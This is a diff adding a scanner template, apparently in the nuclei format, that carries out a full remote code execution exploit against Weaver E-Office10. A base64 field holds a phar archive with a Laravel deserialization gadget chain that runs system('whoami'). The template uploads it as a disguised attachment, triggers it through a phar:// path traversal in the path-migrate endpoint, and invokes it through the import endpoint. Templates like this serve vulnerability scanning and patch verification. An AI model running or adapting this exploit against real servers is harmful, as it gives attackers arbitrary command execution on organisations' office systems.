@@ -1,0 +1,83 @@
+id: poc-yaml-weaver-e-office10-atuh-file-rce
+info:
+  name: Weaver E-Office10 Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  t1: "PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQp9AQAAAQAAABEAAAABAAAAAABHAQAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjU6e3M6MTI6IgAqAGNvbnRhaW5lciI7TjtzOjExOiIAKgBwaXBlbGluZSI7TjtzOjg6IgAqAHBpcGVzIjthOjA6e31zOjExOiIAKgBoYW5kbGVycyI7YTowOnt9czoxNjoiACoAcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6IgAqAGV2ZW50IjtPOjM4OiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xCcm9hZGNhc3RFdmVudCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czo2OiJ3aG9hbWkiO319CAAAAHRlc3QudHh0BAAAACpdBmYEAAAADH5/2KQBAAAAAAAAdGVzdO4PPAt4/NUWNWXWAzOoVlseOkFwAgAAAEdCTUI="
+  payload: "{{base64_decode(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=49de7302166055796bdcdc50ba105ddd
+
+        --49de7302166055796bdcdc50ba105ddd
+        Content-Disposition: form-data; name="Filedata"; filename="register.inc"
+        Content-Type: image/jpeg
+
+        {{payload}}
+        --49de7302166055796bdcdc50ba105ddd--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "attachment_id"
+          - "attachment_name"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+    extractors:
+      - type: regex
+        name: attachment_id
+        internal: true
+        regex:
+          - "\"attachment_id\":\"(?P<attachment_id>.*?)\"," 
+
+  - raw:
+      - |
+        POST /eoffice10/server/public/api/attachment/path/migrate HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"status\":1"
+
+  - raw:
+      - |
+        POST /eoffice10/server/public/api/empower/import HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        type=tttt&file={{attachment_id}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"code\":\"no_file\""
+          - "system"
+      - type: word
+        part: header
+        words:
+          - "application/json"
